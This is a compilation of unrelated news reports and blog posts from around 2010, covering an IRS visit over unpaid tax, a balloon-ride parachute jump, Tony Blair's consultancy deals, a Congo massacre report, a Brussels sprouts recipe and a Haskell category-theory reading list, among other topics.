To be clear : it was $ 0.04 in unpaid tax that had accrued over $ 200 in penalties .
Arriving at Harv's Metro Car Wash in midtown Wednesday afternoon were two dark - suited IRS agents demanding payment of delinquent taxes .
" They were deadly serious , very aggressive , very condescending , " says Harv 's owner , Aaron Zeff … .
" It 's hilarious , " he says , " that two people hopped in a car and came down here for just 4 cents .
I think ( the IRS ) may have a problem with priorities . "

More than 100,000 people have ascended skyward in Irvine 's balloon ride to get expansive views of Orange County , take panoramic photographs and even make the occasional marriage proposal .
But imagine the shock the pilot of the Great Park balloon must have felt just before 9 p.m.
Sunday when , while high above the ground , the gondola shook and a young man parachuted out .
The orange - hued helium balloon had ascended to a height of 330 feet when one of the 12 passengers climbed up and out of the netting enclosing the gondola , unfurled a hidden parachute , threw it in front of him and jumped out , said Irvine city spokesman Craig Reem .
After landing on the tarmac about 100 feet away from the tethered craft , the unidentified man picked up his parachute and ran off , jumping over a fence to where a driver in a white Toyota Supra waited with the engine running .
The two sped off before authorities could catch them .
" The idea of any balloon is to take people up and take them down safely , not to have them jump out at any height , " Reem said .
" What this guy did was pretty dangerous . "
Irvine officials said they would like to find the jumper and are looking into whether the leap violated federal aviation rules against base jumping in populated areas , but they did not involve police because of the quickness of the getaway , Reem said .
Reem described the jumper as a man in his mid-20s , 5 - feet - 11 and 180 pounds , with blond hair .
He was wearing a black jacket and blue jeans .
" He knew how to use a parachute , " Reem said .
It was n't the only incident to take place over the weekend at an attraction at the Great Park , which is being converted from a military airfield into a sprawling , 1,350 - acre public park .
Earlier Sunday , a 48 - year - old woman was hospitalized after she slipped and hit her head in an old hangar being used for ice skating .
The balloon ride had been operating since July 2007 without any recorded accidents or incidents , Reem said .
" Our sincere hope is that no one tries this again , " he said .

Like Franny , Mr. Salinger ’s people feel that “ everything everybody does is so  I do n’t know  not wrong , or even mean , or even stupid necessarily .
But just so tiny and meaningless and  sad - making . ”
Mr. Salinger was able to empathetically limn the nooks and crannies of his youthful narrator ’s psyches , while conjuring up a sophisticated , post - F. Scott Fitzgerald , post - World War II Manhattan  a world familiar to his New Yorker readers , bounded by Radio City Music Hall and Bergdorf Goodman and Central Park ( where Holden wonders about the ducks on the lagoon and where they go when it freezes over in the winter ) .
In doing so , he not only domesticated the innovations of the great modernists  their ability to manipulate stream of consciousness , to probe their characters ’ inner lives  but he also presaged the self - inventorying characters of Philip Roth and Saul Bellow , and the navel - gazing musings of the writers of many Me Generations to come .
Some critics dismissed the easy surface charm of Mr. Salinger ’s work , accusing him of cuteness and sentimentality , but works like “ Catcher , ” “ Franny and Zooey ” and his best - known short stories would influence successive generations of writers .
His most persuasive work showcased his colloquial , idiomatic language , his uncanny gift for ventriloquism , his nimble ability to create stories within stories , as well as his unerring ear for cosmopolitan New Yorkese ( what he called an “ Ear for the Rhythms and Cadences of Colloquial Speech ” ) and his heat - seeking eye for the telling gesture  the nervously lit cigarette , the X - ray look , the inhibited station - platform kiss .
Like Holden Caulfield , the Glass children  Franny , Zooey , Buddy , Seymour , Boo Boo , Walt , Waker  would emerge as avatars of adolescent angst and Mr. Salinger ’s own alienated stance toward the world .
Bright , charming and gregarious , they are blessed with their creator ’s ability to entertain , and they appeal to the reader to identify with their braininess , their sensitivity , their febrile specialness .
And yet as details of their lives unfurl in a series of stories , it becomes clear that there is a darker side to their estrangement as well : a tendency to condescend to the vulgar masses , an almost incestuous familial self - involvement and a difficulty relating to other people that will result in emotional crises and in Seymour ’s case , suicide .
“ Neither you nor Buddy know how to talk to people you do n’t like , ” Zooey ’s mother says , adding , “ You ca n’t live in the world with such strong likes and dislikes . ”
Over time , Mr. Salinger ’s work grew more elliptical .
Tidy , well - made tales like “ A Perfect Day for Bananafish ” gave way to the increasingly prolix “ Zooey ” and the shapeless ruminations of “ Seymour  An Introduction . ”
And as his Glass stories grew more and more self - conscious and self - referential , readers became increasingly aware of the solipsism of that hothouse family of geniuses .
' Curb Your Enthusiasm ' : Larry David says ' pretty good chance ' we 'll get more .
YES !
Curb Your Enthusiasm type TV Show genre Comedy
Here is possibly the best news I can imagine seeing on a rainy Monday morning :
At a recent Curb Your Enthusiasm panel , Reuters reports that Larry David said “ I think there ’s a pretty good chance ” he ’ll do another season of his HBO series .
“ Not definite yet , but we ’re working on some stuff , ” he added .
It ’s never a sure thing that LD will decide to keep going with Curb — and if he ’d wanted to end on the Costanzan high note of last year ’s brilliant season 7 , I would n’t have blamed him .
But this is so much better .
Reuters leads with the fact that David has ruled out any further Seinfeld reunions , which seems fairly obvious .
The reunion was one of my favorite arcs on any television program ever , but there ’s no need to revisit something he ’s nailed so well already .
( Did he also rule out any further organ - transplant plotlines ? )
Otherwise , the potential season 8 is wide open .
Are Larry and on - screen wife Cheryl actually together again ?
Who knows !
David did say that the great Leon Black ( J.B. Smoove ) will “ probably ” be back , which is just wonderful .
The more Leon time we get , the happier I ’ll be .
I would n’t even mind if the next season of Curb resembled Leon Black : How We Dos It , the hypothetical Leon- centric spin- off that Smoove pitched in a Vibe.com Q&A last fall .
What would you like to see on the next season of Curb Your Enthusiasm ?
Bear in mind : Jeff Garlin told the same panel that of all the thousands of plot suggestions strangers have given him , “ I ’ve never heard one funny one . ”
Having said that , maybe yours will be the first idea the show takes seriously …
THQ has announced today that it is hard at work on a new MMO set in the Warhammer 40 K universe and which it is set to unveil for the for the first time at E3 .
According to THQ boss Brian Farrell , the Warhammer 40 K MMO is one that the company hopes will run for many years and which represents the " " that THQ has .
The comments came in an an investor call ( via Eurogamer ) , where Farrell described the project as " " and said that it would be unveiled to gamers for the first time at E3 .
Beyond that very little is known about the game other than the fact that it will be developed by Vigil Games and that the combat will work on a much larger scale than in other Warhammer MMO , Mythic's
The speculation in the office at the moment is that that will mean squad - based combat , with players controlling multiple character to help portray the true scope of the 40 K universe .

Posted by John , March 22nd , 2010 - under Tax , Tax Office , Tax the rich .
There are two defining characteristics of the state – defence of the system and collection of revenue .
Rudd Labor has promised to increase military spending by 3 percent in real terms till at least 2013 .
Its forward defence strategy is aimed at dominating the immediate region and containing China , both under the umbrella of the most powerful country in the world , the United States .
It is the duality of this forward defence that the Australian ruling elite have decided necessitates our close involvement with American expansion across the globe .
Yet when it comes to the other pillar of the state – tax collection – Rudd Labor and predecessor Governments have been much less forthcoming .
The Australian Tax Office collects over $ 300 billion in taxes annually and at the same time gives away $ 100 billion in disguised grants ( known as tax expenditures ) , much of which – apart from the non-taxation of people ’s homes – is to big business .
As a community we fund the ATO $ 3 billion a year to collect $ 300 billion .
While the headline return rate is thus one hundred dollars collected for every dollar spent , the returns on the hard to collect money appear to be about eight dollars for every dollar spent .
For example , last year the Government gave the ATO $ 700 million to raise an extra $ 5.7 billion in tax .
In a speech last month Deputy Commissioner of Taxation Jim Killaly said that 40 percent of big business ( those with a turnover greater than $ 250 million ) had paid no income tax in the three income years between 2006 and 2008 .
He also said twenty percent of those companies were actually making accounting profits .
Analysis by Adele Ferguson and Stuart Washington in the 13 March edition of the Sydney Morning Herald showed that most industries actually pay much less than the headline 30 percent tax rate .
For the finance sector for example they found the figure was 20 percent .
In other words almost half of all big business pays no income tax and those that do mostly pay much less than the notional 30 percent .
Yet unlike defence , the Government handcuffs the Tax Office .
Like all other agencies except Defence the ATO is subject to an efficiency dividend which automatically cuts its funding every year by one percent ( plus the two percent extra efficiency dividend of 2008/09 ) .
This turns the ATO into a supplicant for more funds rather than an eager pursuer of big business .
This is intentional .
The ATO is deliberately hamstrung .
For example it has various oversight and advisory bodies poring over its every action to make sure it does n’t ‘ overstep the mark ’ and actually force big business to pay tax .
Rudd Labor could remove these fetters on the ATO ’s effectiveness .
It won’t
The ATO does n’t have the resources to fully investigate big business effectively .
No Government – Labor or Liberal – has the political will to give the Tax Office the money , the staff or the powers to attack non-compliance by big business .
They are the Governments of big business .
Both conservative parties see big business as the engine of economic development and tax as some cost to them operating .
It is this philosophy which shapes Government underfunding of the ATO .
The tax system is built on the archaic distinction between capital and income but every attempt to develop a more sensible base – such as treating all gains as income – is met with ferocious opposition from big business and their advisers .
The fact that much big business activity is international also creates enforcement problems for the Tax Office .
Cross - border arrangements are of their nature often more complex and less transparent .
The ATO has n’t exactly covered itself in glory here .
It has run down its specialist international section and promoted the narrow thinking detail fetishists into leadership positions across the Office .
If action is taken now it will still be a decade before the ATO overcomes these organisational problems .
Couple all of this with a range of complex laws resulting from the archaic income / capital distinction and the opportunity for game playing – also known as tax planning – is immense .
As the former Assistant Commissioner in charge of the ATO input into international tax reform I battled long and hard and eventually won a grand total of 8 staff to help me in our task .
By comparison one of the large accountancy firms had 20 staff working full time ( ie looking for tax arbitrage opportunities ) on those same reforms .
Paying tax officers , and hence all public servants more , would help address the intellectual and commitment divergence .
There is a myth around that tax is about equity .
The reality , as the figures show , is the exact opposite .
The whole system is set up to favour big business .
Making sure the ATO collects only part of what it can from them is part of that strategy .
The comparison with Defence is instructive .
We are supposedly in Afghanistan to fight terrorists , but the Government allows the tax terrorists to destroy the revenue system and cut the revenue benefits that could be provided in the form of better schools , hospitals and transport to ordinary working Australians .
Rudd Labor could easily fund the ATO with an extra $ 1 billion to specifically attack the avoidance schemes and other rorts by big business and bring in around $ 10 billion .
It could even change our laws to redress the power imbalance currently in favour of the avoiders .
It wo n’t .
But a Dutch Defense Ministry spokesman in The Hague said Dutch forces were not involved in calling for the airstrike .
The spokesman , who spoke in return for customary anonymity , did not say who had called for air support .
NATO officials did not immediately identify the forces involved in the strike .
“ Yesterday a group of suspected insurgents , believed to be en route to attack a joint Afghan - ISAF unit , was engaged by an airborne weapons team resulting in a number of individuals killed and wounded , ” the American - led International Security Assistance Force , also known as ISAF , said in a statement released Monday .
“ After the joint ground force arrived at the scene and found women and children , they transported the wounded to medical treatment facilities . ”
Zemarai Bashary , a spokesman for the Afghan Interior Ministry , said the victims were all civilians .
He said two Land Cruisers and a pickup truck carrying a total of 42 people were attacked by air near Khotal Chowzar , a mountain pass that connects Daykondi Province with Oruzgan Province in central Afghanistan .
Mr. Bashary said there were no Afghan forces known to be operating in the area where the airstrike took place , but an investigation was under way to determine who was involved .
The cabinet statement , posted on the president ’s Web site in English and Dari , said there were 27 dead , including 4 women and a child , and 12 people wounded .
Mr. Bashary said only 21 dead had been confirmed so far , with 14 wounded and 2 missing , but he said those were preliminary figures .
The commander of ISAF , Gen . Stanley A. McChrystal , apologized to Mr. Karzai on Sunday night and ordered an investigation into what had happened , the international force said , and on Monday , the force distributed a video statement by the general translated into Dari and Pashto .
Ritalin is recommended for severe cases of ADHD Adults with attention deficit hyperactivity disorder ( ADHD ) are struggling to access treatment because of a lack of services , figures suggest .
Prescriptions for drugs to treat the condition fall off significantly in 15 - 21 year olds , a study has shown .
It suggests that some adults who would benefit from treatment are not getting it , the NHS - funded researchers said .
The government said there were efforts to improve the transition between child and adult mental health services .
Treatment for ADHD in adolescents and young adults is not clear cut , said study leader Professor Ian Wong , from the School of Pharmacy at the University of London .
It was quite clear when we interviewed clinicians that it's a real problem
Professor Ian Wong , study lead
But there is increasing evidence to suggest that the condition , which is associated with inattention and impulsiveness , does not just affect children as was once believed .
Prof
Wong said it had been unclear what proportion of young people continue treatment as they get older and the reason for them not taking medication if they stop .
Using data from a large GP database , the researchers found that in 15 - 21 year olds there is a large drop in those still on the drugs , which include Ritalin .
The figures showed that this decline in prescribing was greater than the reported decline in symptoms - suggesting that people were no longer taking medication when they still had problems .
Access to care A series of interviews with patients and doctors highlighted that although some patients felt they no longer needed treatment , others wanted it but had difficulty accessing specialist services once they had been discharged from paediatric care .
" The results of our study suggest there is a possibility that treatment is prematurely discontinued in some young adults , " says Professor Wong .
" For some , they are still having symptoms but they can't get hold of treatments .
" It was quite clear when we interviewed clinicians that it 's a real problem . "
National guidelines published in 2008 say drugs should be only used for children and young people with severe ADHD , and it should be in addition to psychological and behavioural interventions .
A Department of Health spokesman said : " The transition from child and adolescent mental health services to adult services is a critical point for young people with complex mental health needs including those with ADHD .
" The government is developing support to help young people 's and adult services improve these transitions to ensure that both the processes and the models of care meet the needs of young people and their families . "

I 've had a few requests from people wanting to teach themselves applications of Category Theory to Haskell based on posts I 've made .
I 've made things difficult by posting stuff at random levels of difficulty and without any kind of organising thread through them .
So here 's an attempt to list a bunch of posts related to aspects of category theory .
I 've grouped them by themes and within each theme I 've tried to list the articles in order of difficulty .
Unfortunately there can be big gaps between one article and the next as none of this material was intended to be linked together continuously .
Nonetheless , I hope this is of some help .
First a warning : Category Theory Screws You Up !
The first theme has to be monads of course .
But do n't forget : monads do n't do anything .
They 're simply an interface to something that you must already have implemented some other way .
So do n't believe all that hype about how monads are what allow Haskell to use side effects and I / O.
I think this is one of the great applications of Category Theory to Computer Science .
Structural recursion can be characterised really nicely in terms of F - algebras .
That 's cool .
But even cooler is that when you dualise the definitions you get a great way to look at non-terminating computations on things like streams .
Trying to order these is tricky .
I 'm not sure I define the term commutative monad until the talk .
I'm not sure the killer application for comonads has been found yet .
But I do think they 're good for things like dataflow and cellular automata fit the comonad model very well :
And these are generally categorical articles
One of the most trusted progressive voices in the senate said Monday evening the effort to improve health care in America will not be over once the Democratic bill passes .
In fact , he declared , it ’s just the beginning .
“ I believe that at the end of the day , what we need is a Medicare - for - all , single payer system , ” Sen. Bernie Sanders ( I - VT ) said on MSNBC’s The Ed Show .
“ This is far from that .
But that fight continues .
So , this is a step forward .
And let us not underestimate the good in this bill , let ’s continue to fight . ”

After a year of extensive debates , the resulting legislation has drawn the ire of many progressives , who are upset that it does not expand public alternatives for consumers .
But according to Sanders , that is n’t enough of a reason to strike it down .
“ The answer is pass this bill and make it better the day after , ” Sanders said , citing the Congressional Budget Office ’s conclusion that it will cover millions who are uninsured and ban insurers from denying care to sick people and individuals with pre-existing illnesses .
“ Let ’s not ignore the reality that 31 million more Americans are going to get health insurance , ” he said .
A self - described democratic socialist and single - payer champion , Sanders nevertheless declared resolutely that “ doing nothing is not an option ” and suggested the present bill ’s passage would make the nation more likely , not less , to move toward that goal .
“ This country cannot accept 45,000 people a year dying because they do n’t get to a doctor on time , ” he said , adding that “ the cost of premiums are going to double ” within the next decade , referring to an Urban Institute study cited by host Ed Schultz earlier in the segment .

“ What middle class family can sustain that ? ” Sanders asked .
A study by the consumer advocacy organization U.S. Public Interest Research Group found last January that if reform fails , insurance premiums could conceivable double as soon as 2016 , HealthDay News noted .
A report by the Commonwealth Fund in August said that under the status quo , health care costs for average Americans are likely double by 2020 .
The senator from Vermont last week criticized the White House for spending months trying to fruitlessly court Republican votes , but said President Obama has “ final got th[e ] message ” that it is n’t going to happen .

The GOP remains resolutely opposed to the bill , while progressive activist groups like the Progressive Change Campaign Committee continue to stress the importance of a public option .
Democrats are just short of the votes they need to push the health care bill past the finish line , party leaders say .
Obama ’s top aides predicted Sunday that health care reform will pass within the week .

Sometimes it ’s getting close to dinnertime and you have no idea what you ’re going to make .
So you look in the pantry and the fridge and ask yourself , “ What can I make out of this ? ”
This day , I found Brussels sprouts , leftover diced tomatoes , and Asiago cheese .
Hmm … I ’ve always got onions , and I ’ve always got bacon fat .
I ’ll bet that would all work together .
And it does .
Ingredients
Brussels sprouts
onion
diced tomato
Asiago cheese
bacon fat
kosher salt
fresh ground black pepper
Directions
First off , do n’t ask for amounts on this one .
It was whatever I had left .
You can see it all in that picture above .
( I only used about half the sprouts in that bowl , though . )
Cut the stems of the sprouts and split them in half lengthwise .
Peel off any yellow outer leaves .
Melt the bacon fat over medium heat .
( Click here for info on rending and storing bacon fat . )
You can use butter , but you ’ll be missing out on a ton of flavor .
If you ’ve got some bacon lying around , chop it up , cook it , and leave it in the pan while you follow the rest of the recipe .
Dice the onion ( click the link for directions ) and add it to the pan .
Add salt and pepper and cook over medium - low heat , stirring or tossing occasionally , until the onion is softened and starting to darken .
Once the onion starts to caramelize , add some more bacon fat , and the cut Brussels sprouts .
Toss to make sure the sprouts are coated , then turn them so they ’re all cut - side down .
Cover the pan so the steam will help cook the sprouts faster .
Once the sprouts are soft all the way through , 5 - 10 minutes — toss a few times along the way to make sure they do n’t burn on the bottom — add the diced tomatoes .
Stir together and cook just until the tomatoes are warm , but not so much that they break down into sauce .
Top with shredded Asiago cheese .
And that ’s it .

The rejection comes despite the Griffin character ’s flattery that Benson is “ Ellen , Joan Crawford , and Calamity Jane all rolled into one .

A source from inside the Ubuntu team has informed a blogger that there will be an important announcement coming from Canonical regarding a possible rebranding of Ubuntu .
A lot of enthusiasts are quick to speculate that the changes will be all about the color schemes used by Ubuntu and that it may go from brown to gray .
Evidence pointing to an Ubuntu makeover is this Ubuntu Single Sign
On page where the logo being used is color gray and not the usual brown .
There ’s also this statement made by Shuttleworth from a recent interview in which he said : " We 'll have some new styling which is going to be the starting point of another five year view .
We 've been Human for the last five years and now we 're going to be light oriented .
" I remembered reading an article ( I forgot the link ) about Mark Shuttleworth expressing his desire to equal or beat Mac OS X in terms of user interface and overall polish , which made me think and agree to all the rumors that Ubuntu might try to imitate the Mac OS desktop interface .
If indeed Ubuntu turns to gray or light oriented as they call it , how will the users react ?
If you ask me , I would n't mind the color change as long as the Ubuntu look will remain unique and not trying to be like a Mac .
What do you think ?
​ A Washington state medical marijuana activist — who nearly killed an armed intruder in his home this month — has been barred from buying guns , even though he says he has no criminal record .
Steve Sarich of CannaCare said he tried to buy a shotgun and a pistol a few days after the March 15 shootout at his home , to replace guns that were seized by investigators , reports Gene Johnson of The Associated Press .
But Sarich said he failed the background check .
Sarich got an email from the King County Sheriff ’s Office Tuesday , attempting to explain the denial .
It says Sarich showed law enforcement officers his paperwork as a medical marijuana patient — and those papers create a presumption that Sarich is an “ unlawful user ” of a controlled substance .
Sarich is a legal medical marijuana patient under Washington ’s medical marijuana law , passed by voters in 1998 .
The sheriff ’s office said that since federal law says using a “ controlled substance ” disqualifies someone from passing a background check for gun purchases , Sarich ca n’t buy any more firearms .
Sarich said he finds it absurd that medical marijuana patients should have to give up their Second Amendment rights .

Blair 's fight to keep his oil cash secret : Former PM 's deals are revealed as his earnings since 2007 reach £ 20 million
Advertisement
Tony Blair waged an extraordinary two - year battle to keep secret a lucrative deal with a multinational oil giant which has extensive interests in Iraq .
The former Prime Minister tried to keep the public in the dark over his dealings with South Korean oil firm UI Energy Corporation .
Mr Blair - who has made at least £ 20 million since leaving Downing Street in June 2007 - also went to great efforts to keep hidden a £ 1 million deal advising the ruling royal family in Iraq 's neighbour Kuwait .
In an unprecedented move , he persuaded the committee which vets the jobs of former ministers to keep details of both deals from the public for 20 months , claiming it was commercially sensitive .
The deals emerged yesterday when the Advisory Committee on Business Appointments finally lost patience with Mr Blair and decided to ignore his objections and publish the details .
News of the secret deals fuelled fresh accusations that Mr Blair is ' cashing in on his contacts ' from the controversial Iraq war in what one MP called ' revolving door politics at its worst ' .
They will increase concerns that Mr Blair is using his role as the West 's Middle East envoy for personal gain .
The revelations also shed fresh light on his astonishing earnings , which include lucrative after - dinner speaking , consultancies with banks and foreign governments , a generous advance for his forthcoming memoirs , as well as the pension and other perks he enjoys as a former Prime Minister .
The full extent of his income is cloaked in secrecy because he has constructed a complex web of shadowy companies and partnerships which let him avoid publishing full accounts detailing all the money from his commercial ventures .
Critics also point out that a large proportion of his earnings comes from patrons in America and the Middle East - a clear benefit from forging a close alliance with George Bush during his invasion of Iraq .
Last night Tory MP Douglas Carswell said of Mr Blair 's links to UI Energy Corporation : ' This does n't just look bad , it stinks .
' It seems that the former Prime Minister of the United Kingdom has been in the pay of a very big foreign oil corporation and we have been kept in the dark about it .
' Even now we do not know what he was paid or what the company got out of it .
We need that information now .
' This is revolving door politics at its worst .
It 's not as if Mr Blair has even stepped back from politics , because he is still politically active in the Middle East .
' I'm afraid I have no confidence at all in the committee that vets these appointments .
It 's no good telling us these deals may be commercially sensitive - we are talking about the appointment of our former Prime Minister and the public interest , rather than any commercial interests , must come first . '
Liberal Democrat MP Norman Baker said : ' These revelations show that our former Prime Minister is for sale - he is driven by making as much money as possible .
' I think many people will find it deeply insensitive that he is apparently cashing in on his contacts from the Iraq war to make money for himself . '
The committee said yesterday that Mr Blair had taken a paid job advising a consortium of investors led by UI Energy in August 2008 .
The exact nature of the deal is unknown , but UI Energy is one of the biggest investors in Iraq 's oil - rich Kurdistan region , which became semi-autonomous in the wake of the Iraq war .
Mr Blair 's fee has not been disclosed but is likely to have run into hundreds of thousands of pounds .
The secrecy is particularly odd because UI Energy is fond of boasting of its foreign political advisers , who include the former Australian prime minister Bob Hawke and several prominent American politicians .
Mr Blair successfully persuaded the committee that the appointment was ' market sensitive ' and could not be made public .
The committee agreed to suspend its normal practice and keep the deals secret for three months .
Mr Blair then asked for a further extension .
When this ran out last year the committee repeatedly ' chased '
Mr Blair about the issue without hearing anything .
Eventually the committee 's chairman , former Tory Cabinet minister Lord Lang , reviewed the papers and ordered the deal to be made public , along with a separate deal with Kuwait which had been kept secret at the request of the Kuwaiti government .
The decision to keep the deals secret will fuel concerns about the effectiveness of the committee , which has been repeatedly criticised for its failure to halt the revolving door between politics and industry .
The committee is supposed to ease public concerns about former public servants using their contacts for private gain .
Ministers have to have all jobs vetted within two years of leaving office .
But the committee is packed with former politicians and Whitehall grandees and is thought never to have banned a former minister or senior civil servant from taking up a lucrative job in the private sector .
Earlier this month the Government quietly rejected calls for the committee to be beefed up with more figures from outside the world of politics .
Gordon Brown has so far refused to answer questions about whether Mr Blair 's arrangements breach his responsibilities under the ministerial code .
A spokesman for Mr Blair said last night : ' Mr Blair gave a one - off piece of advice in respect of a project for UI Energy in August 2008 .
' He sought , and received , approval from the Committee on Business Appointments before undertaking this project .
' It was UI Energy who requested of the committee that they delay public announcement , for reasons of market sensitivity . '
It was the miracle that set Pope John Paul II on the road to sainthood and provided faithful followers with proof of his holy powers .
But hopes that the former pope 's canonisation would be fast - tracked by Sister Marie Simon - Pierre 's recovery from Parkinson 's disease have been set back by reports that the French nun has fallen ill again .
Simon - Pierre described three years ago how she regained her health after a night of prayer to the then recently deceased Polish pontiff .
John Paul also suffered from Parkinson 's disease , which is incurable .
" It 's like a second birth , " she said at the time .
" I feel like I 've discovered a new body , new limbs . "
In 2007 Simon - Pierre could barely move her left side , could not write legibly , drive or move around easily and was in constant pain .
Her disease worsened after the pope 's death , and her order prayed for his intervention to ease her suffering .
Then after writing his name on a paper one night , she woke up the next day apparently cured and returned to work as a maternity nurse with no traces of the disease .
But according to the Polish daily newspaper Rzeczpospolita , one of the doctors charged with scrutinising the nun 's case believed she might have been suffering from a similar nervous disease , not Parkinson's , which could go into sudden remission .
A report on the paper 's website went further , saying that the 49 - year - old nun had become sick again with the same illness .
The Vatican was making no comment on the grounds that the late pope 's case was still under examination .
Although no date has been fixed for the late pope 's beatification , there had been an expectation that it would be announced in mid-October .
His case was fast - tracked by his successor , Pope Benedict , and the anniversary of John Paul 's election falls on 16 October .
The first sign that all might not be as it should be came when the Vatican fixed the canonisation of six new saints for the following day , a Sunday , making a beatification the same weekend impossible .
Vatican sources stressed that the panel of doctors which will examine the evidence relating to Simon - Pierre 's recovery was not due to meet until April , when it will consider a report by two medical experts .
Beatification is an intermediate step on the road to canonisation , though not all of those declared " blessed " go on to become saints .
Beatification requires at least one miracle .
A second is needed for sainthood .
The Vatican , whose congregation [ department ] for the cause of saints deals with canonisations and beatifications , has been under relentless pressure to speed up John Paul 's progress .
On the day of his funeral in 2005 there were unparalleled scenes in St Peter 's Square , when the crowd took up a chant of " santo subito " , or " saint straightaway " .
( CNN ) --
A rebel group in the Democratic Republic of Congo killed at least 321 civilians and abducted 250 others -- including at least 80 children -- in a previously unreported rampage late last year , Human Rights Watch said in a report released Saturday .
The Lord 's Resistance Army ( LRA ) carried out the brutal campaign in northeastern Congo over four days in December , the report said .
LRA forces attacked at least 10 villages from December 14 to 17 , killing and abducting hundreds of civilians -- including women and children , according to Human Rights Watch .
LRA combatants tied up villagers in the nation 's remote Makombo area and hacked them to death with machetes or crushed their skulls with axes and heavy wooden sticks , the report said .
Most of those killed were adult men , but at least 13 women and 23 children were among the dead -- including a 3 - year - old girl who was burned to death , according to Human Rights Watch .
The LRA also killed those they abducted who walked too slowly or tried to escape , Human Rights Watch said .
According to those who managed to escape , children captured by the LRA were forced to kill other children who had disobeyed the LRA 's rules , the report said .
In numerous cases , children were ordered to surround the victim in a circle and take turns beating the child on the head with a large wooden stick until the child died , the report said .
" The Makombo massacre is one of the worst ever committed by the LRA in its bloody 23 - year history , yet it has gone unreported for months , " said Anneke Van Woudenberg , a senior Africa researcher at Human Rights Watch .
" The four - day rampage demonstrates that the LRA remains a serious threat to civilians and is not a spent force , as the Ugandan and Congolese governments claim . "
CNN could not independently confirm the massacre .
Human Rights
Watch said that the roughly 1,000 United Nations peacekeeping troops in LRA - affected parts of northeastern Congo are insufficient to protect civilians .
The peacekeeping force is considering removing some troops from the area under pressure from the Congolese government , a move Human Rights Watch warned against on Saturday .
The U.N. Security Council is planning to visit Congo in mid-April to discuss the peacekeeping force 's plans for withdrawal and the protection of civilians , Human Rights Watch said .
The Congolese government denies that the LRA is still a serious threat in the country , which may have contributed to the absence of reports about the December massacre , Human Rights Watch said .
" We have been forgotten , " an 80 - year - old Congolese man whose son was killed during the massacre told Human Rights Watch .
" It 's as if we do n't exist . "
" The government says the LRA are no longer a problem , but I know that 's not true , " he said .
" I beg of you , please talk to others about what has happened to us . "
The LRA is led by self - declared mystic and prophet Joseph Kony , who claims his insurgency -- which began in 1986 -- is aimed at replacing Uganda 's government , led by President Yoweri Museveni , with a democracy based on the Bible 's Ten Commandments .
After being pushed out of Uganda in 2005 , the LRA now operates in the remote border area between southern Sudan , Congo , and Central African Republic .
In 2005 , the International Criminal Court issued arrest warrants for senior LRA leaders for crimes they committed in northern Uganda , but those indicted remain at large .
The two commanders who perpetrated the December massacre report to one of those indicted leaders , according to Human Rights Watch .
The Makombo massacre is the deadliest documented attack by the LRA since killing sprees around Christmas 2008 left scores of Congolese dead , but dozens of other attacks against civilians have been carried out in other areas in recent months , Human Rights Watch said .
answering one fallacy with another
Creationists attack evolution with a hydra of bad faith arguments and logical fallacies .
Trying to counter them using the bandwagon fallacy is only playing into their hands .
Today , if you come across an idea or an opinion held by at least a few thousand people , chances are it has at least one blog , an official website with talking points , and a Facebook page dedicated to it .
Actually , in a world where hundreds of millions of people use the web to learn and communicate , if your opinion is n’t floating out in the social media realm , it ’s irrelevant as far as the public is concerned .
That ’s exactly why growing numbers of creationist groups have been taking to the web and creating pages asking social media users to support their cause by joining their group and showing that the voice of creationism is strong to all those evolutionist heathens .
And oddly enough , plenty of scientifically minded web users fell for this trick and decided to start a page that counters one bandwagon fallacy with another .
But just like trying to chop off the mythical Hydra ’s head only results in two more mouthfuls of fangs , playing the creationists ’ games is n’t going to help prove the validity of evolution to those who want to deny the science which sends them into hysterical bouts of fear …
Let ’s remember that when it comes to science , facts are facts .
They live independently of public opinion .
A very good example of just how irrelevant public agreement on those facts is , was presented by Penn and Teller on their show during an episode in which they took votes on the gender of rabbits .
Male rabbits will be male and female rabbits will be female no matter how many times they would ’ve voted .
This is why any argument which bases popular support as its main piece of supporting evidence is inherently flawed .
Creationists could count their numbers until next Friday and gloat about how many people have doubts with the validity of evolution to a roar of supportive crowds .
That does n’t mean creationism is valid and never will .
But hold on a second , do n’t scientists talk about a scientific consensus and use that as evidence for evolutionary theories ?
Yes , but when we ’re talking about a scientific consensus , things are very different .
Going back to the Penn and Teller ’s rabbit example , the only way to find out who ’s male and who ’s female is to take a look , and the same idea applies to every field of scientific study .
To come up with a consensus on the facts , someone has to find out what those facts actually are and document them for peer review and debate based on the findings of others .
And this is what scientists do , take a look and let the colleagues do the same .
When enough scientists take a good , long look , debate , and come to an agreement that all of them saw the same thing and until someone is going to collect compelling evidence proving them wrong , the matter is settled and their conclusions could be made official .
Compare that to creationists posturing about how many people share their beliefs or doubt the scientific conclusion that evolution is a very good theory based on a solid , factual framework .
Can they offer a testable , workable alternative to today ’s evolutionary biology ?
Considering that many vocal creationists can’t even get a few rudimentary scientific basics straight , I would n’t hold my breath about that .
And this is exactly why the last thing the scientific minded should do is give in to creationist games and reply to their fallacy with an identical one , especially when they ’re the ones in a position which can use real , tangible evidence to make their case instead of relying on pointless popularity contests .
If you really want to prove something creationist zealots , you ’re certainly not going to do it by making important science a social media competition .
Besides , even if creationists blogs and pages had a hundredth of the popularity of their scientific counterparts , would those who equate Darwin with Hitler consider their cause lost and accept they may be wrong ?
Maybe , but those who did would be the exception rather than the rule .
The vast majority of creationists would do what that always do when their arguments fall flat and move the goalposts , decrying that so many could ascribe to the “ corrupt , atheistic , and morally bankrupt evil that is evolution ” and keep insisting that they have a monopoly on the truth since they have Bibles .
After all , creationists already believe that they ’re right and everyone whose scientific and religious views do n’t match theirs is wrong solely for having a different worldview .
The details of how they assert their self - assumed correctness to the god-hating heathens of the outside world is something creationists usually tend to consider a matter of semantics …
On February 4 , Secretary of State Hillary Clinton was the surprise keynote speaker for the 58th annual National Prayer Breakfast .
The Breakfast is the one public event organized by the secretive Washington network , the Family , a group of elite fundamentalists who minister to DC ’s powerful and wealthy who are seen as the divinely “ elect , ” chosen for leadership by God .
With the Family in the news this past year due to the string of sex scandals at its “ C Street ” house for members of Congress — and later for the role it seems to have played in shaping the draconian anti-gay law introduced in Uganda last year — the speech by Clinton , sandwiched between Family head Doug Coe ’s introduction and the traditional presidential address by Barack Obama , was an interesting coda to her strange status as a longtime “ friend ” of the Family .
Although much of the media coverage focused on Clinton ’s and then President Obama ’s condemnations of the anti-gay bill ( leading religion scholar Mark Silk to suggest that Clinton ’s role was damage control as the Family struggles to make the Uganda bill “ go away ” )
Clinton ’s speech also underscored the Family ’s influence in pushing her stance on reproductive freedom rightward .
In her address , Clinton sentimentally recalled meeting Mother Teresa at the 1994 National Prayer Breakfast .
